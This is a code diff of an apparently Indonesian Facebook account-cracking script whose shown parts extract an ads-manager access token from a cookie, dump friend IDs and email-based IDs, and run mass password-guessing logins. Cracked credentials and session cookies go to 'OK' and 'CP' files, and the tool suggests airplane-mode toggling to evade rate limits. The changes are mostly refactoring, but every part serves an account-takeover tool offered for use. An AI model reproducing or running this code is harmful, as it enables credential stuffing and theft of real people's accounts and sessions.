@@ -138,13 +138,13 @@ class Miya:
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": self.Useragent(),
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "sec-fetch-site": "same-origin",
+            "sec-fetch-site": "none",
             "sec-fetch-mode": "navigate",
             "sec-fetch-user": "?1",
             "sec-fetch-dest": "document",
             "referer": "https://free.prod.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fpages%2F%3Fcategory%3Dtop%26ref%3Dbookmarks%26wtsid%3Drdr_0WLXe9WWdaCQsCD7x&ref=bookmarks&fl&login_from_aymh=1&refid=9",
             "accept-encoding": "gzip, deflate, br",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6"}
+            "accept-language": "id,en-US;q=0.8,en;q=0.9"}
         return ( headers )   
         
     #----------[ HEADERS-REGULER-V2 ]----------#
@@ -167,13 +167,13 @@ class Miya:
             "content-type": "application/x-www-form-urlencoded",
             "user-agent": self.Useragent(),
             "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "sec-fetch-site": "same-origin",
+            "sec-fetch-site": "none",
             "sec-fetch-mode": "navigate",
             "sec-fetch-user": "?1",
             "sec-fetch-dest": "document",
             "referer": "https://free.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
             "accept-encoding": "gzip, deflate, br",
-            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,pt;q=0.6"}
+            "accept-language": "id,en-US;q=0.8,en;q=0.9"}
         return ( headers )   
         
     #----------[ HEADERS-EMAIL ]----------#
@@ -204,7 +204,6 @@ class FanzMiya:
     def __init__(self):
         self.ip = requests.get("http://ip-api.com/json/").json()["query"]
         self.negara = requests.get("http://ip-api.com/json/").json()["country"]
-        self.ses = requests.Session()
         self.exec_menu('')
         
     #----------[ DELETED-DATA-LOGIN ]----------#
@@ -247,15 +246,15 @@ class FanzMiya:
         Cons().print(f' {J}»{A} Country {H}{self.negara}')
         Cons().print(f'\n {A}[{J}1{A}] login menggunakan cookie')
         Cons().print(f' {A}[{J}2{A}] login menggunakan id/nama/email')
-        CK = Cons().input(f'\n {J}*_»{A} Choose : ')
+        CK = Cons().input(f'\n {J}»{A} Choose : ')
         
         #----------[ LOGIN-COOKIE ]----------#
         if CK =='1' or CK =='01':
             Cons().print(f'\n {J}# {M}WARNING \n\n {J}*{A} cookies harus fres \n {J}*{A} saran cookie dough \n {J}*{A} jangan akun pribadi')
-            cookie = Cons().input(f'\n {J}*_»{A} Cookie : ')
+            cookie = Cons().input(f'\n {J}»{A} Cookie : ')
             try:
                 tok = self.dapatkan_token_eaab(cookie,'')
-                Cons().print(f' {J}*_»{A} Token : {H}{tok}')
+                Cons().print(f' {J}»{A} Token : {H}{tok}')
                 self.dapatkan_username(cookie)
                 self.follows_dong(cookie, tok)
                 with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
@@ -267,57 +266,60 @@ class FanzMiya:
         #----------[ LOGIN-ID-NAMA-EMAIL ]----------#
         elif CK =='2' or CK =='02':
             Cons().print(f'\n {J}*{A} masukan id \n {J}*{A} masukan nama \n {J}*{A} masukan email')
-            userid = Cons().input(f'\n {J}*_»{A} id/nama/email : ')
+            userid = Cons().input(f'\n {J}»{A} id/nama/email : ')
             if userid =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
-            userpas = Cons().input(f' {J}*_»{A} Sandi : ')
+            userpas = Cons().input(f' {J}»{A} Sandi : ')
             if userpas =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
             try:
-                response = self.ses.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&ref=dbl&fl&login_from_aymh=1&refid=9').text
-                encoding = {
-                     "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
-                     "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
-                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
-                     "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
-                     "try_number": 0, 
-                     "unrecognized_tries": 0, 
-                     "email":userid, 
-                     "pass": userpas,
-                     "login":"Log + In", 
-                     "bi_xrwh": 0}
-                headers = Miya().head_login()
-                params = {'next':'https://m.facebook.com/adsmanager/manage/campaigns?wtsid=rdr_072QbFsCLxwR5Rssa','ref':'dbl','fl':'','login_from_aymh':'1','refid':'9'}
-                response = par(self.ses.post('https://m.facebook.com/login/',data=encoding, params=params, headers=headers, allow_redirects=False).text,"html.parser")
+                with requests.Session() as xyc:
+                    response = xyc.get('https://m.facebook.com/login/?next=https%3A%2F%2Fm.facebook.com%2Fadsmanager%2Fmanage%2Fcampaigns%3Fwtsid%3Drdr_072QbFsCLxwR5Rssa&ref=dbl&fl&login_from_aymh=1&refid=9').text
+                    encoding = {
+                         "lsd": re.search('name="lsd" value="(.*?)"', str(response)).group(1), 
+                         "jazoest": re.search('name="jazoest" value="(\d+)"', str(response)).group(1), 
+                         "m_ts": re.search('name="m_ts" value="(.*?)"', str(response)).group(1), 
+                         "li": re.search('name="li" value="(.*?)"', str(response)).group(1), 
+                         "try_number": 0, 
+                         "unrecognized_tries": 0, 
+                         "email":userid, 
+                         "pass": userpas,
+                         "login":"Log + In", 
+                         "bi_xrwh": 0}
+                    headers = Miya().head_login()
+                    params = {'next':'https://m.facebook.com/adsmanager/manage/campaigns?wtsid=rdr_072QbFsCLxwR5Rssa','ref':'dbl','fl':'','login_from_aymh':'1','refid':'9'}
+                    response = par(xyc.post('https://m.facebook.com/login/',data=encoding, params=params, headers=headers, allow_redirects=False).text,"html.parser")
             except ConnectionError as e: sys.exit(e)
             except:pass
             try:
-               payload = self.ses.cookies.get_dict()
-               if 'c_user' or payload.keys():
-                   cookie = ';'.join(['%s=%s'%(name,value) for name,value in self.ses.cookies.get_dict().items()])
-                   Cons().print(f'\n {J}*_»{A} Cookie : {H}{cookie}')
-                   tok = self.dapatkan_token_eaab(cookie,'')
-                   Cons().print(f' {J}*_»{A} Token : {H}{tok}')
-                   self.dapatkan_username(cookie)
-                   self.follows_dong(cookie, tok)
-                   with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
-                       wr.write(json.dumps({'Cookie': cookie}))
-                       wr.close()
-                   Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
+               with requests.Session() as xyc:
+                   payload = xyc.cookies.get_dict()
+                   if 'c_user' or payload.keys():
+                       cookie = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
+                       Cons().print(f'\n {J}»{A} Cookie : {H}{cookie}')
+                       tok = self.dapatkan_token_eaab(cookie,'')
+                       Cons().print(f' {J}»{A} Token : {H}{tok}')
+                       self.dapatkan_username(cookie)
+                       self.follows_dong(cookie, tok)
+                       with open(file+'.cookie.json',mode='w',encoding='utf8') as wr:
+                           wr.write(json.dumps({'Cookie': cookie}))
+                           wr.close()
+                       Cons().print(f'\n {J}#{A} login berhasil, silakan jalankan ulang pythonnya'); sys.exit()
             except Exception as e: sys.exit(e)
         else: Cons().print(f'\n {J}*_>{M} oke brooo ');exit()
             
     #----------[ TOKEN-EAAB ]----------#
     def dapatkan_token_eaab(self, cookie, file = 'data/login/'):
         try:
-            url = self.ses.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1",cookies={"cookie": cookie})
-            src = re.search('act=(\d+)',url.text).group(1)
-            try:
-                act = self.ses.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=%s&breakdown_regrouping=1"%(src),cookies={"cookie": cookie})
-                tok = re.search('.__accessToken="(.*?)"',act.text).group(1)
-                with open(file+'.token_eaab.json',mode='w',encoding='utf8') as wr:
-                    wr.write(json.dumps({'Token': tok}))
-                    wr.close()
-                return tok
-            except ConnectionError as e: sys.exit(e)        
+            with requests.Session() as xyc:
+                url = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1",cookies={"cookie": cookie})
+                src = re.search('act=(\d+)',url.text).group(1)
+                try:
+                    act = xyc.get("https://adsmanager.facebook.com/adsmanager/manage/campaigns?act=%s&breakdown_regrouping=1"%(src),cookies={"cookie": cookie})
+                    tok = re.search('.__accessToken="(.*?)"',act.text).group(1)
+                    with open(file+'.token_eaab.json',mode='w',encoding='utf8') as wr:
+                        wr.write(json.dumps({'Token': tok}))
+                        wr.close()
+                    return tok
+                except ConnectionError as e: sys.exit(e)        
         except AttributeError as e: sys.exit(e)   
         
     #----------[ PLEASE-JANGAN-DI-GANTI ]----------#
@@ -333,14 +335,15 @@ class FanzMiya:
     #----------[ MENGAMBIL-USERNAME ]----------#
     def dapatkan_username(self, cookie):
         try:
-            url = par(self.ses.get("https://www.facebook.com/profile.php",headers={'User-Agent':UaFresto}, cookies={'cookie':cookie}).text, "html.parser")
-            try:
-                nam = re.findall('<title>(.*?)</title>',str(url))[0]
-                with open('.nama.json',mode='w',encoding='utf8') as wr:
-                    wr.write(json.dumps({'Nama': nam}))
-                    wr.close()
-                return nam
-            except ConnectionError as e: sys.exit(e)        
+            with requests.Session() as xyc:
+                url = par(xyc.get("https://www.facebook.com/profile.php",headers={'User-Agent':UaFresto}, cookies={'cookie':cookie}).text, "html.parser")
+                try:
+                    nam = re.findall('<title>(.*?)</title>',str(url))[0]
+                    with open('.nama.json',mode='w',encoding='utf8') as wr:
+                        wr.write(json.dumps({'Nama': nam}))
+                        wr.close()
+                    return nam
+                except ConnectionError as e: sys.exit(e)        
         except AttributeError as e: sys.exit(e)
 
     #----------[ MENU-CRACKING ]----------# 
@@ -361,30 +364,30 @@ class FanzMiya:
         Cons().print(f' {A}[{J}5{A}] Cek result ok/cp')
         Cons().print(f' {A}[{J}6{A}] Lapor bug script')
         Cons().print(f' {A}[{J}0{A}] keluar dari tools')
-        FCF = Cons().input(f'\n {J}*_»{A} Choose : ')
+        FCF = Cons().input(f'\n {J}»{A} Choose : ')
         
         #----------[ CRACK-PUBLIK ]----------#
         if FCF =='1' or FCF =='01':
             Cons().print(f'\n {J}#{A} Banyaknya id, pisahkan dengan koma')
-            user = Cons().input(f' {J}*_»{A} ID : ')
+            user = Cons().input(f' {J}»{A} ID : ')
             if user =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
             Cons().print(f'\n {J}#{A} Ketik ctrl + c untuk berhenti dump')
             for uuid in user.split(','):
                 try:
                     Dump().dump_publik(uuid,cookie,token,'')
                 except KeyboardInterrupt: pass
-                except Exception as e: sys.exit(e)
+                except Exception as e: print(e)
                 Crack().Generate_list()
                 
        #----------[ CRAK-EMAIL ]----------#       
         elif FCF =='3' or FCF =='03':
             Cons().print(f'\n {J}#{A} Banyaknya Nama, pisahkan dengan koma')
-            user = Cons().input(f' {J}*_»{A} Nama : ')
+            user = Cons().input(f' {J}»{A} Nama : ')
             if user =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
-            total = Cons().input(f' {J}*_»{A} Limit : ')
+            total = Cons().input(f' {J}»{A} Limit : ')
             if total =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
             Cons().print(f'\n {J}#{A} example ({H}@gmail.com, yahoo.com, dll{A})')
-            doma = Cons().input(f' {J}*_»{A} Domain : ')
+            doma = Cons().input(f' {J}»{A} Domain : ')
             if doma =='': Cons().print(f'\n {J}*_>{M} kamu kaya kontol');exit()
             Cons().print(f'\n {J}#{A} Ketik ctrl + c untuk berhenti dump')
             for nama in user.split(','):
@@ -406,8 +409,7 @@ class FanzMiya:
         elif FCF =='0' or FCF =='00':
             KC = Cons().input(f'\n {J}#{A} ingin keluar atau dengan hapus cookie ( y/t ): ')
             if KC in ['y','Ya','Y','YA']: self.deleted_data('')
-            else: sys.exit()
-            
+            else: sys.exit()      
         else: Cons().print(f'\n {J}*_>{M} oke brooo ');exit()   
 
 # DUMP                                         
@@ -427,11 +429,11 @@ class Dump:
                 format = '%s<=>%s'%(xyz['id'],xyz['name'])
                 if format not in dumpid:
                     dumpid.append(format)
-                    Cons().print(f' {J}*_»{A} sedang dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
+                    Cons().print(f' {J}»{A} sedang dump {H}{str(len(dumpid))}{A} idz',end='\r'); sys.stdout.flush()
             if 'fields' in str(response):
                 self.dump_publik(uuid,cookie,token,response["friends"]["paging"]["cursors"]["after"])
-        except ( KeyboardInterrupt ): pass
-        except ( Exception ) as e: sys.exit(e)
+        except KeyboardInterrupt: pass
+        except AttributeError: pass
         
     #----------[ DUMP-EMAIL ]----------#
     def dump_email(self,nama,total,doma):
@@ -457,7 +459,7 @@ class Crack:
         print('\n')
         Cons().print(f' {A}[{J}1{A}] Reguler')
         Cons().print(f' {A}[{J}2{A}] RegulerV2')
-        execlogin = Cons().input(f'\n {J}*_»{A} Choose : ')
+        execlogin = Cons().input(f'\n {J}»{A} Choose : ')
         Cons().print(f'\n {A}[{J}*{A}] Hasil OK Simpan/{H}OK/{self.okc} \n {A}[{J}*{A}] Hasil CP Simpan/{K}CP/{self.cpc} \n\n {J}#{A} Mainkan Mode Pesawat Setiap 300 ID\n')
         prog = Progress(TextColumn("{task.description}"), TextColumn("{task.percentage:.0f}%"))
         des = prog.add_task('',total=len(dumpid))
@@ -485,7 +487,7 @@ class Crack:
         
     #-----[ METHOD-REGULER ]-----#
     def Reguler(self,userid,password):
-        prog.update(des,description=f' {J}# {A}SFC.Cracking {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+        prog.update(des,description=f' {J}# {A}SFC.Cracking {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
         prog.advance(des)
         for userpas in password:
             try:
@@ -509,7 +511,7 @@ class Crack:
                     payload = xyc.cookies.get_dict()          
                     if 'c_user' in payload.keys():
                         coki = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
-                        print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                         resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                         with open('OK/'+self.okc,'a') as wr:
                             wr.write(resok+'\n')
@@ -517,7 +519,7 @@ class Crack:
                         self.suck+=1                
                         break                                                                       
                     elif 'checkpoint' in payload.keys():
-                        print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                         rescp=('%s<=>%s<=>%s'%(userid,userpas))      
                         with open('CP/'+self.cpc,'a') as wr:
                             wr.write(rescp+'\n')
@@ -525,15 +527,15 @@ class Crack:
                         self.check+=1                   
                         break
                     else:continue
-            except ( requests.exceptions.ConnectionError ):
-                prog.update(des,description=f' {J}# {M}SFC.Spam {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+            except requests.exceptions.ConnectionError:
+                prog.update(des,description=f' {J}# {M}SFC.Spam {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                 prog.advance(des)
                 time.sleep(31)
         self.loop+=1
         
     #-----[ METHOD-REGULERV2 ]-----#
     def RegulerV2(self,userid,password):
-        prog.update(des,description=f' {J}# {A}SFC.Cracking {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+        prog.update(des,description=f' {J}# {A}SFC.Cracking {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
         prog.advance(des)
         for userpas in password:
             try:
@@ -557,7 +559,7 @@ class Crack:
                     payload = xyc.cookies.get_dict()          
                     if 'c_user' in payload.keys():
                         coki = ';'.join(['%s=%s'%(name,value) for name,value in xyc.cookies.get_dict().items()])
-                        print(f' {J}*__> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {H}{userid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                         resok=('%s<=>%s<=>%s'%(userid,userpas,coki)) 
                         with open('OK/'+self.okc,'a') as wr:
                             wr.write(resok+'\n')
@@ -565,7 +567,7 @@ class Crack:
                         self.suck+=1                
                         break                                                                       
                     elif 'checkpoint' in payload.keys():
-                        print(f' {J}*__> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {K}{userid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                         rescp=('%s<=>%s<=>%s'%(userid,userpas))      
                         with open('CP/'+self.cpc,'a') as wr:
                             wr.write(rescp+'\n')
@@ -573,8 +575,8 @@ class Crack:
                         self.check+=1                   
                         break
                     else:continue
-            except ( requests.exceptions.ConnectionError ):
-                prog.update(des,description=f' {J}# {M}SFC.Spam {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+            except requests.exceptions.ConnectionError:
+                prog.update(des,description=f' {J}# {M}SFC.Spam {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                 prog.advance(des)
                 time.sleep(31)
         self.loop+=1
@@ -616,7 +618,7 @@ class CrackM:
         
     #-----[ METHOD-REGULER ]-----#
     def RegulerOri(self,userid,password):
-        prog.update(des,description=f' {J}# {A}SFC.Cracking {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+        prog.update(des,description=f' {J}# {A}SFC.Cracking {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
         prog.advance(des)
         for userpas in password:
             try:
@@ -651,7 +653,7 @@ class CrackM:
                         try:
                             uid = re.findall('c_user=(.*);xs', coki)[0]
                         except: uid = userid
-                        print(f' {J}*__> {H}{uid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {H}{uid}{J}<=>{H}{userpas}{J}<=>{H}{coki}{A}',end='\r'); sys.stdout.flush()
                         resok=('%s<=>%s<=>%s'%(uid,userpas,coki)) 
                         with open('OK/'+self.okc,'a') as wr:
                             wr.write(resok+'\n')
@@ -662,16 +664,16 @@ class CrackM:
                         try:
                             uid = xyc.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
                         except: uid = userid
-                        print(f' {J}*__> {K}{uid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
+                        print(f' {A}#——> {K}{uid}{J}<=>{K}{userpas}{A}',end='\r'); sys.stdout.flush()
                         rescp=('%s<=>%s<=>%s'%(uid,userpas))      
                         with open('CP/'+self.cpc,'a') as wr:
                             wr.write(rescp+'\n')
                             wr.close()
-                        self.check+=1                   
+                        self.check+=1               
                         break
                     else:continue
-            except ( requests.exceptions.ConnectionError ):
-                prog.update(des,description=f' {J}# {M}SFC.Spam {J}*_> {H}OK {A}-: {H}{self.suck} {K}CP {A}-: {K}{self.check} {J}Die {A}-: {J}{len(dumpid)}/{self.loop}{A}')
+            except requests.exceptions.ConnectionError:
+                prog.update(des,description=f' {J}# {M}SFC.Spam {H}{self.suck}{A}/{K}{self.check} {J}{len(dumpid)}{A}/{J}{self.loop}{A}')
                 prog.advance(des)
                 time.sleep(31)
         self.loop+=1
